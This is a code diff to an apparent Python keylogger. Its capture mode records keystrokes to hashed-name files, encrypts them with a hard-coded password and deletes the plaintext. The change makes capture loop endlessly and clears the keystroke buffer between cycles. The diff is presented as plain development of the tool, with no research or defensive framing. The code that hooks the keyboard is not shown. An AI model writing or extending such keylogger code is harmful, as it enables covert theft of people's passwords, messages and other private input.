@@ -32,6 +32,7 @@ def encrypt_file(filename, password):
 
 def clean_up(filename):
     os.remove(filename)
+    keystrokes.clear()
 
 def decrypt(filename, password):
     with open(filename, "rb") as infile:
@@ -48,11 +49,12 @@ def Main():
     args = parser.parse_args()
 
     if args.mode == "capture":
-        filename = hashlib.sha1(str(time.time()).encode()).hexdigest() + ".txt"
-        begin_capture()
-        record_keystrokes(filename)
-        encrypt_file(filename, ENCRYPTION_PASSWORD)
-        clean_up(filename)
+        while True:
+            filename = hashlib.sha1(str(time.time()).encode()).hexdigest() + ".txt"
+            begin_capture()
+            record_keystrokes(filename)
+            encrypt_file(filename, ENCRYPTION_PASSWORD)
+            clean_up(filename)
     elif args.mode == "decrypt" and args.filename is not None:
         decrypt(args.filename, ENCRYPTION_PASSWORD)
     else:
